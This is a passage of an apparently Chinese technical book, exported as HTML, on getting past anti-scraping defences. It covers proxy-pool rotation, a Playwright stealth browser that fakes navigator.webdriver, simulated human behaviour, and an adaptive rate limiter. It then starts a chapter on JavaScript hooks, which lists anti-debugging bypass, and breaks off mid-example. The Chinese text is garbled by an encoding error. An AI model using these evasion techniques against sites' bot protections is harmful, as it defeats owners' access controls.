        <span class="c1"># ä» Redis æœ‰åºé›†åˆè·å–è¯„åˆ†æœ€é«˜çš„ä»£ç†</span>
        <span class="n">proxies</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">r</span><span class="o">.</span><span class="n">zrange</span><span class="p">(</span><span class="s1">&#39;proxy_pool&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">proxies</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">proxies</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
        <span class="k">return</span> <span class="kc">None</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">validate_proxy</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">proxy</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bool</span><span class="p">:</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;éªŒè¯ä»£ç†&quot;&quot;&quot;</span>
        <span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s1">&#39;http&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s1">&#39;http://</span><span class="si">{</span><span class="n">proxy</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">,</span>
            <span class="s1">&#39;https&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s1">&#39;http://</span><span class="si">{</span><span class="n">proxy</span><span class="si">}</span><span class="s1">&#39;</span>
        <span class="p">}</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span>
                <span class="bp">self</span><span class="o">.</span><span class="n">test_url</span><span class="p">,</span>
                <span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">,</span>
                <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span>
            <span class="p">)</span>
            <span class="k">return</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="k">return</span> <span class="kc">False</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">mark_success</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">proxy</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æ ‡è®°ä»£ç†æˆåŠŸ&quot;&quot;&quot;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">r</span><span class="o">.</span><span class="n">zincrby</span><span class="p">(</span><span class="s1">&#39;proxy_pool&#39;</span><span class="p">,</span> <span class="o">-</span><span class="mf">0.1</span><span class="p">,</span> <span class="n">proxy</span><span class="p">)</span>  <span class="c1"># é™ä½åˆ†æ•° = æé«˜ä¼˜å…ˆçº§</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">mark_failure</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">proxy</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æ ‡è®°ä»£ç†å¤±è´¥&quot;&quot;&quot;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">r</span><span class="o">.</span><span class="n">zincrby</span><span class="p">(</span><span class="s1">&#39;proxy_pool&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">proxy</span><span class="p">)</span>  <span class="c1"># æé«˜åˆ†æ•° = é™ä½ä¼˜å…ˆçº§</span>

        <span class="c1"># å¦‚æœå¤±è´¥æ¬¡æ•°è¿‡å¤šï¼Œç§»é™¤ä»£ç†</span>
        <span class="n">score</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">r</span><span class="o">.</span><span class="n">zscore</span><span class="p">(</span><span class="s1">&#39;proxy_pool&#39;</span><span class="p">,</span> <span class="n">proxy</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">score</span> <span class="o">&gt;</span> <span class="mi">10</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">r</span><span class="o">.</span><span class="n">zrem</span><span class="p">(</span><span class="s1">&#39;proxy_pool&#39;</span><span class="p">,</span> <span class="n">proxy</span><span class="p">)</span>
</code></pre>
      </div>

      <h3 id="3-browser-simulator">3. Browser Simulator</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">playwright.sync_api</span><span class="w"> </span><span class="kn">import</span> <span class="n">sync_playwright</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">random</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>

<span class="k">class</span><span class="w"> </span><span class="nc">BrowserSimulator</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">playwright</span> <span class="o">=</span> <span class="n">sync_playwright</span><span class="p">()</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">browser</span> <span class="o">=</span> <span class="kc">None</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">launch_browser</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">headless</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">proxy</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;å¯åŠ¨æµè§ˆå™¨&quot;&quot;&quot;</span>
        <span class="n">launch_options</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s1">&#39;headless&#39;</span><span class="p">:</span> <span class="n">headless</span><span class="p">,</span>
            <span class="s1">&#39;args&#39;</span><span class="p">:</span> <span class="p">[</span>
                <span class="s1">&#39;--disable-blink-features=AutomationControlled&#39;</span><span class="p">,</span>
                <span class="s1">&#39;--disable-dev-shm-usage&#39;</span><span class="p">,</span>
                <span class="s1">&#39;--no-sandbox&#39;</span><span class="p">,</span>
            <span class="p">]</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="n">proxy</span><span class="p">:</span>
            <span class="n">launch_options</span><span class="p">[</span><span class="s1">&#39;proxy&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;server&#39;</span><span class="p">:</span> <span class="n">proxy</span><span class="p">}</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">browser</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">playwright</span><span class="o">.</span><span class="n">chromium</span><span class="o">.</span><span class="n">launch</span><span class="p">(</span><span class="o">**</span><span class="n">launch_options</span><span class="p">)</span>
        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">browser</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">create_stealth_context</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;åˆ›å»ºéšèº«ä¸Šä¸‹æ–‡&quot;&quot;&quot;</span>
        <span class="n">context</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">browser</span><span class="o">.</span><span class="n">new_context</span><span class="p">(</span>
            <span class="n">viewport</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;width&#39;</span><span class="p">:</span> <span class="mi">1920</span><span class="p">,</span> <span class="s1">&#39;height&#39;</span><span class="p">:</span> <span class="mi">1080</span><span class="p">},</span>
            <span class="n">user_agent</span><span class="o">=</span><span class="s1">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36&#39;</span><span class="p">,</span>
            <span class="n">locale</span><span class="o">=</span><span class="s1">&#39;zh-CN&#39;</span><span class="p">,</span>
            <span class="n">timezone_id</span><span class="o">=</span><span class="s1">&#39;Asia/Shanghai&#39;</span><span class="p">,</span>
        <span class="p">)</span>

        <span class="c1"># æ³¨å…¥åæ£€æµ‹è„šæœ¬</span>
        <span class="n">context</span><span class="o">.</span><span class="n">add_init_script</span><span class="p">(</span><span class="s2">&quot;&quot;&quot;</span>
<span class="s2">            // è¦†ç›– navigator.webdriver</span>
<span class="s2">            Object.defineProperty(navigator, &#39;webdriver&#39;, {</span>
<span class="s2">                get: () =&gt; undefined</span>
<span class="s2">            });</span>

<span class="s2">            // è¦†ç›– navigator.plugins</span>
<span class="s2">            Object.defineProperty(navigator, &#39;plugins&#39;, {</span>
<span class="s2">                get: () =&gt; [1, 2, 3, 4, 5]</span>
<span class="s2">            });</span>

<span class="s2">            // è¦†ç›– navigator.languages</span>
<span class="s2">            Object.defineProperty(navigator, &#39;languages&#39;, {</span>
<span class="s2">                get: () =&gt; [&#39;zh-CN&#39;, &#39;zh&#39;, &#39;en&#39;]</span>
<span class="s2">            });</span>

<span class="s2">            // Chrome æ£€æµ‹ç»•è¿‡</span>
<span class="s2">            window.chrome = {</span>
<span class="s2">                runtime: </span><span class="si">{}</span>
<span class="s2">            };</span>
<span class="s2">        &quot;&quot;&quot;</span><span class="p">)</span>

        <span class="k">return</span> <span class="n">context</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">simulate_human_behavior</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">page</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æ¨¡æ‹Ÿäººç±»è¡Œä¸º&quot;&quot;&quot;</span>
        <span class="c1"># éšæœºæ»šåŠ¨</span>
        <span class="n">page</span><span class="o">.</span><span class="n">evaluate</span><span class="p">(</span><span class="s2">&quot;&quot;&quot;</span>
<span class="s2">            () =&gt; {</span>
<span class="s2">                window.scrollTo({</span>
<span class="s2">                    top: Math.random() * document.body.scrollHeight,</span>
<span class="s2">                    behavior: &#39;smooth&#39;</span>
<span class="s2">                });</span>
<span class="s2">            }</span>
<span class="s2">        &quot;&quot;&quot;</span><span class="p">)</span>
        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">uniform</span><span class="p">(</span><span class="mf">0.5</span><span class="p">,</span> <span class="mi">2</span><span class="p">))</span>

        <span class="c1"># éšæœºé¼ æ ‡ç§»åŠ¨</span>
        <span class="n">page</span><span class="o">.</span><span class="n">mouse</span><span class="o">.</span><span class="n">move</span><span class="p">(</span>
            <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span> <span class="mi">500</span><span class="p">),</span>
            <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span> <span class="mi">500</span><span class="p">)</span>
        <span class="p">)</span>
        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">uniform</span><span class="p">(</span><span class="mf">0.2</span><span class="p">,</span> <span class="mf">0.5</span><span class="p">))</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">scrape_with_stealth</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;éšèº«çˆ¬å–&quot;&quot;&quot;</span>
        <span class="n">context</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">create_stealth_context</span><span class="p">()</span>
        <span class="n">page</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">new_page</span><span class="p">()</span>

        <span class="k">try</span><span class="p">:</span>
            <span class="n">page</span><span class="o">.</span><span class="n">goto</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">wait_until</span><span class="o">=</span><span class="s1">&#39;networkidle&#39;</span><span class="p">)</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">simulate_human_behavior</span><span class="p">(</span><span class="n">page</span><span class="p">)</span>
            <span class="n">content</span> <span class="o">=</span> <span class="n">page</span><span class="o">.</span><span class="n">content</span><span class="p">()</span>
            <span class="k">return</span> <span class="n">content</span>
        <span class="k">finally</span><span class="p">:</span>
            <span class="n">page</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
            <span class="n">context</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</code></pre>
      </div>

      <h3 id="4-rate-limiter">4. Rate Limiter</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">time</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">random</span>

<span class="k">class</span><span class="w"> </span><span class="nc">AdaptiveRateLimiter</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">base_delay</span><span class="o">=</span><span class="mf">1.0</span><span class="p">,</span> <span class="n">max_delay</span><span class="o">=</span><span class="mf">10.0</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">base_delay</span> <span class="o">=</span> <span class="n">base_delay</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">max_delay</span> <span class="o">=</span> <span class="n">max_delay</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">current_delay</span> <span class="o">=</span> <span class="n">base_delay</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">success_count</span> <span class="o">=</span> <span class="mi">0</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">failure_count</span> <span class="o">=</span> <span class="mi">0</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">wait</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;ç­‰å¾…é€‚å½“çš„æ—¶é—´&quot;&quot;&quot;</span>
        <span class="n">delay</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">current_delay</span> <span class="o">+</span> <span class="n">random</span><span class="o">.</span><span class="n">uniform</span><span class="p">(</span><span class="o">-</span><span class="mf">0.5</span><span class="p">,</span> <span class="mf">0.5</span><span class="p">)</span>
        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="nb">max</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">delay</span><span class="p">))</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">record_success</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è®°å½•æˆåŠŸè¯·æ±‚&quot;&quot;&quot;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">success_count</span> <span class="o">+=</span> <span class="mi">1</span>

        <span class="c1"># è¿ç»­æˆåŠŸï¼Œé€æ¸å‡å°‘å»¶è¿Ÿ</span>
        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">success_count</span> <span class="o">&gt;</span> <span class="mi">10</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">current_delay</span> <span class="o">=</span> <span class="nb">max</span><span class="p">(</span>
                <span class="bp">self</span><span class="o">.</span><span class="n">base_delay</span><span class="p">,</span>
                <span class="bp">self</span><span class="o">.</span><span class="n">current_delay</span> <span class="o">*</span> <span class="mf">0.9</span>
            <span class="p">)</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">success_count</span> <span class="o">=</span> <span class="mi">0</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">record_failure</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è®°å½•å¤±è´¥è¯·æ±‚&quot;&quot;&quot;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">failure_count</span> <span class="o">+=</span> <span class="mi">1</span>

        <span class="c1"># å¤±è´¥åˆ™å¢åŠ å»¶è¿Ÿ</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">current_delay</span> <span class="o">=</span> <span class="nb">min</span><span class="p">(</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">max_delay</span><span class="p">,</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">current_delay</span> <span class="o">*</span> <span class="mf">1.5</span>
        <span class="p">)</span>

        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">failure_count</span> <span class="o">&gt;</span> <span class="mi">5</span><span class="p">:</span>
            <span class="c1"># ä¸¥é‡é™æµï¼Œé•¿æ—¶é—´ç­‰å¾…</span>
            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">max_delay</span> <span class="o">*</span> <span class="mi">2</span><span class="p">)</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">failure_count</span> <span class="o">=</span> <span class="mi">0</span>
</code></pre>
      </div>

      <hr />

      <h2 id="å®Œæ•´æ¡†æ¶é›†æˆ">å®Œæ•´æ¡†æ¶é›†æˆ</h2>

      <div class="codehilite">
        <pre><span></span><code><span class="k">class</span><span class="w"> </span><span class="nc">AntiAntiScrapingFramework</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">config</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">middleware</span> <span class="o">=</span> <span class="n">RequestMiddleware</span><span class="p">()</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">proxy_manager</span> <span class="o">=</span> <span class="n">ProxyManager</span><span class="p">()</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">browser_simulator</span> <span class="o">=</span> <span class="n">BrowserSimulator</span><span class="p">()</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">rate_limiter</span> <span class="o">=</span> <span class="n">AdaptiveRateLimiter</span><span class="p">()</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">fetch</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">use_browser</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æ™ºèƒ½çˆ¬å–&quot;&quot;&quot;</span>
        <span class="c1"># é€Ÿç‡é™åˆ¶</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">rate_limiter</span><span class="o">.</span><span class="n">wait</span><span class="p">()</span>

        <span class="k">try</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">use_browser</span><span class="p">:</span>
                <span class="c1"># ä½¿ç”¨æµè§ˆå™¨æ¨¡æ‹Ÿ</span>
                <span class="n">result</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_fetch_with_browser</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="c1"># ä½¿ç”¨è¯·æ±‚åº“</span>
                <span class="n">result</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_fetch_with_requests</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>

            <span class="bp">self</span><span class="o">.</span><span class="n">rate_limiter</span><span class="o">.</span><span class="n">record_success</span><span class="p">()</span>
            <span class="k">return</span> <span class="n">result</span>

        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">rate_limiter</span><span class="o">.</span><span class="n">record_failure</span><span class="p">()</span>
            <span class="k">raise</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">_fetch_with_requests</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;ä½¿ç”¨ requests çˆ¬å–&quot;&quot;&quot;</span>
        <span class="n">proxy</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">proxy_manager</span><span class="o">.</span><span class="n">get_proxy</span><span class="p">()</span>
        <span class="n">headers</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">middleware</span><span class="o">.</span><span class="n">get_random_headers</span><span class="p">()</span>

        <span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;http&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s1">&#39;http://</span><span class="si">{</span><span class="n">proxy</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;https&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s1">&#39;http://</span><span class="si">{</span><span class="n">proxy</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">}</span> <span class="k">if</span> <span class="n">proxy</span> <span class="k">else</span> <span class="kc">None</span>

        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>

        <span class="k">if</span> <span class="n">proxy</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">proxy_manager</span><span class="o">.</span><span class="n">mark_success</span><span class="p">(</span><span class="n">proxy</span><span class="p">)</span>

        <span class="k">return</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">_fetch_with_browser</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;ä½¿ç”¨æµè§ˆå™¨çˆ¬å–&quot;&quot;&quot;</span>
        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">browser_simulator</span><span class="o">.</span><span class="n">scrape_with_stealth</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>

<span class="c1"># ä½¿ç”¨</span>
<span class="n">config</span> <span class="o">=</span> <span class="p">{}</span>
<span class="n">framework</span> <span class="o">=</span> <span class="n">AntiAntiScrapingFramework</span><span class="p">(</span><span class="n">config</span><span class="p">)</span>
<span class="n">result</span> <span class="o">=</span> <span class="n">framework</span><span class="o">.</span><span class="n">fetch</span><span class="p">(</span><span class="s1">&#39;https://example.com&#39;</span><span class="p">,</span> <span class="n">use_browser</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</code></pre>
      </div>

      <hr />

      <h2 id="ç›¸å…³ç« èŠ‚">ç›¸å…³ç« èŠ‚</h2>

      <ul>
        <li><a href="#04-Advanced-Recipes-anti-scraping-deep-dive">åçˆ¬è™«æŠ€æœ¯æ·±åº¦åˆ†æ</a></li>
        <li><a href="#04-Advanced-Recipes-browser-fingerprinting">æµè§ˆå™¨æŒ‡çº¹è¯†åˆ«ä¸å¯¹æŠ—</a></li>
        <li><a href="#06-Engineering-proxy-pool-management">ä»£ç†æ± ç®¡ç†</a></li>
      </ul>

    </div>
  </div>
  <div class="chapter">
    <h1 class="no-page-break">ğŸ“„ Part VII: Code Kitchen</h1>

    <div class="section" id="07-Scripts-javascript-hook-scripts">
      <h2>58. JavaScript Hook Scripts</h2>
      <h1 id="javascript-hook-è„šæœ¬">JavaScript Hook è„šæœ¬</h1>

      <h2 id="æ¦‚è¿°">æ¦‚è¿°</h2>

      <p>Hookï¼ˆé’©å­ï¼‰æ˜¯é€†å‘å·¥ç¨‹ä¸­æœ€æ ¸å¿ƒçš„åŠ¨æ€åˆ†ææŠ€æœ¯ä¹‹ä¸€ã€‚é€šè¿‡è¿è¡Œæ—¶åŠ«æŒ(Runtime
        Interception)åŸç”ŸAPIæˆ–è‡ªå®šä¹‰å‡½æ•°ï¼Œå¯ä»¥å®ç°å¯¹ç›®æ ‡ä»£ç çš„æ— ä¾µå…¥å¼ç›‘æ§ã€å‚æ•°ç¯¡æ”¹å’Œè¡Œä¸ºä¿®æ”¹ã€‚HookæŠ€æœ¯åŸºäºJavaScriptçš„åŠ¨æ€ç‰¹æ€§å’ŒåŸå‹é“¾æœºåˆ¶ï¼Œèƒ½å¤Ÿåœ¨ä¸ä¿®æ”¹æºä»£ç çš„æƒ…å†µä¸‹æ”¹å˜ç¨‹åºæ‰§è¡Œæµç¨‹ã€‚</p>

      <h3 id="hook-æŠ€æœ¯åŸç†">Hook æŠ€æœ¯åŸç†</h3>

      <p>Hookçš„æœ¬è´¨æ˜¯<strong>å‡½æ•°æ›¿æ¢</strong>ï¼ˆFunction Replacementï¼‰å’Œ<strong>ä»£ç†æ¨¡å¼</strong>ï¼ˆProxy Patternï¼‰ã€‚é€šè¿‡ä»¥ä¸‹å‡ ç§æ–¹å¼å®ç°ï¼š</p>

      <ol>
        <li><strong>ç›´æ¥æ›¿æ¢</strong>ï¼šä¿å­˜åŸå‡½æ•°å¼•ç”¨ï¼Œç”¨æ–°å‡½æ•°æ›¿æ¢ç›®æ ‡å‡½æ•°</li>
        <li><strong>åŸå‹é“¾åŠ«æŒ</strong>ï¼šä¿®æ”¹ <code>prototype</code> ä¸Šçš„æ–¹æ³•ï¼Œå½±å“æ‰€æœ‰å®ä¾‹</li>
        <li><strong>å±æ€§æè¿°ç¬¦åŠ«æŒ</strong>ï¼šä½¿ç”¨ <code>Object.defineProperty</code> æ‹¦æˆªå±æ€§è®¿é—®</li>
        <li><strong>Proxy ä»£ç†</strong>ï¼šä½¿ç”¨ ES6 Proxy å®ç°æ›´ç²¾ç»†çš„æ‹¦æˆªæ§åˆ¶</li>
      </ol>

      <h3 id="åº”ç”¨åœºæ™¯">åº”ç”¨åœºæ™¯</h3>

      <ul>
        <li><strong>API ç›‘æ§</strong>: è¿½è¸ª XHR/Fetch è¯·æ±‚ã€Cookie æ“ä½œã€Storage è®¿é—®</li>
        <li><strong>åŠ å¯†åˆ†æ</strong>: æ•è·åŠ å¯†å‡½æ•°çš„è¾“å…¥è¾“å‡ºï¼Œå®šä½å¯†é’¥å’Œç®—æ³•</li>
        <li><strong>åè°ƒè¯•ç»•è¿‡</strong>: å±è”½ <code>debugger</code> è¯­å¥å’Œæ§åˆ¶å°æ£€æµ‹</li>
        <li><strong>è¡Œä¸ºä¿®æ”¹</strong>: ä¿®æ”¹å‡½æ•°è¿”å›å€¼ï¼Œç»•è¿‡éªŒè¯é€»è¾‘</li>
        <li><strong>æ€§èƒ½åˆ†æ</strong>: ç»Ÿè®¡å‡½æ•°è°ƒç”¨æ¬¡æ•°å’Œæ‰§è¡Œæ—¶é—´</li>
      </ul>

      <hr />

      <h2 id="åŸºç¡€-hook-æ¨¡æ¿">åŸºç¡€ Hook æ¨¡æ¿</h2>

      <h3 id="1-hook-å…¨å±€å‡½æ•°">1. Hook å…¨å±€å‡½æ•°</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// ä¿å­˜åŸå§‹å‡½æ•°</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">originalFunction</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nx">targetFunction</span><span class="p">;</span>

<span class="c1">// æ›¿æ¢ä¸ºè‡ªå®šä¹‰å‡½æ•°</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">targetFunction</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(...</span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[Hook] targetFunction called&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[Hook] Arguments:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// è°ƒç”¨åŸå§‹å‡½æ•°</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">originalFunction</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">);</span>

<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[Hook] Return value:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">result</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">result</span><span class="p">;</span>
<span class="p">};</span>
</code></pre>
      </div>

      <hr />

      <h2 id="ç½‘ç»œè¯·æ±‚-hook">ç½‘ç»œè¯·æ±‚ Hook</h2>

      <h3 id="hook-xmlhttprequest">Hook XMLHttpRequest</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">originalOpen</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">XMLHttpRequest</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">open</span><span class="p">;</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">originalSend</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">XMLHttpRequest</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">send</span><span class="p">;</span>

<span class="w">    </span><span class="c1">// Hook open</span>
<span class="w">    </span><span class="nx">XMLHttpRequest</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">open</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">method</span><span class="p">,</span><span class="w"> </span><span class="nx">url</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
